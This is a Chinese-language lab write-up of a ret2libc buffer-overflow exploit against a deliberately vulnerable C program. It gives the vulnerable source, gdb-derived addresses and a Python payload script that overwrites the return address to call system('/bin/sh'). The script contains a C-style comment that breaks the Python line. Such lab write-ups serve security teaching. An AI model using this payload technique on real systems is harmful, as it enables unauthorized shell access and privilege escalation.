上一个实验中我们关闭了栈的不可执行保护，实现了栈上的代码执行。但是现实中编译器编译的代码默认都开启了栈不可执行，之前的攻击难以奏效。那么怎样用其他的方法实现 shell 代码执行呢？一种攻击方法是 ret-to-libc，也就是将函数地址跳转到动态链接库 libc 中的 system 函数地址，来实现控制流转移。
来看以下有漏洞可利用的源代码：
```c
// buf3.c
// gcc -o buf3 buf3.c -fno-stack-protector

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void vul(char *str){
    char buffer[36];
    // buffer overflow
    strcpy(buffer, str);
}

int main(int argc, char **argv){
    char str[128];
    FILE *file;
    file = fopen("attack_input3", "r");
    fread(str, sizeof(char), 128, file);
    vul(str);
    printf("Returned Properly\n");
    return 0;
}
```
代码部分和上一题并没有任何不同，只是在编译时关闭了栈可执行选项，这样之前的攻击方式不奏效了。
但是我们的攻击目标仍然是通过缓冲区溢出，覆写 vul 函数的返回地址，使得它跳转到libc 库中的 system 函数，而且需要传的参数为字符串 "/bin/sh" 来启动一个 shell，实现提权。具体而言，栈的布局应如下所示：
![](https://cdn.nlark.com/yuque/0/2024/jpeg/43291115/1716288582969-eef657b9-9e3f-48e4-9749-0577176c2605.jpeg)
首先我们要明确一点，在 ret2libc 中，程序执行之后，system 有关代码已经被加载到了内存代码段中，所以接下来我们要找到他的地址。一种最简单的方法是 gdb 调试，用 p system 指令来确定地址。
![Pwnhub-2024-05-21-18-27-01.png](https://cdn.nlark.com/yuque/0/2024/png/43291115/1716287239836-ff003c4b-575b-4c4a-ba4e-25dedcfd8b64.png#averageHue=%235d6140&clientId=u77a3053e-f768-4&from=ui&height=660&id=u7d97a74b&originHeight=1440&originWidth=2560&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2153688&status=done&style=none&taskId=u16e56749-2164-41e1-ac57-f279be5435d&title=&width=1174)
这样我们拿到了地址是 0xf7c48170。
第二步工作是找到 "/bin/sh" 字符串的所在地址，这一步可以用 IDA 静态分析，也可以用 gdb 查找。由于虚拟机没有安装 IDA，就用 gdb 查找吧。
![Pwnhub-2024-05-21-18-38-16.png](https://cdn.nlark.com/yuque/0/2024/png/43291115/1716288373715-af16ffcf-d464-43dd-ba1e-6c0c766f58d1.png#averageHue=%235c603f&clientId=ubfff2a84-5189-4&from=ui&height=668&id=u4d81d0ec&originHeight=1440&originWidth=2560&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2167035&status=done&style=none&taskId=u941943a4-2984-43ec-b11c-6f2db4392d7&title=&width=1187)
这样字符串的地址也找到了：0xf7dbd0d5。
要注意的是，system 后面应该带有一个 system 函数的返回地址，但是我们并不关心这个后续跳转，只需要拿到权限即可，所以 ret 地址可以随意赋值。
最后我们还需要确定 buffer 和 ret 地址的距离，确保覆写有效。由于漏洞代码相同，ASLR 也是关闭的，所以这一步就和之前一致了。
ebp = 0xffffcfb8
buffer 起始地址 = ebp - 0x2c = 0xffffcf8c
于是 buffer 到 ret 偏移量 offset = ebp + 4 - buffer = 0x30
构造以下 Payload：
```python
import sys
import struct
from pwn import *

offset = 0x30 # modify it
system_addr = 0xf7c48170 # modify it
binsh_addr =  0xf7dbd0d5 # modify it
ret = 0xdeadbeef
## Put the shellcode at the begin
buf = (offset - 4) * b'\x90' + 2 * struct.pack('<I', system_addr) + struct.pack('<I', ret) + struct.pack('<I', binsh_addr)
buf += (128 - len(buf)) * b'a' // 填满128字节
file = open('attack_input3', 'wb')
file.write(buf)
file.close()
```
运行，拿到 shell！
![Pwnhub-2024-05-21-19-01-24.png](https://cdn.nlark.com/yuque/0/2024/png/43291115/1716289314904-f0ab6992-23bc-491b-ac33-361c720318f7.png#averageHue=%235f6141&clientId=u09a5df98-4e26-4&from=ui&height=662&id=u24c0cfaa&originHeight=1440&originWidth=2560&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2006557&status=done&style=none&taskId=u60fcc1f7-9b4d-47f8-9630-c4bcea99a4d&title=&width=1177)
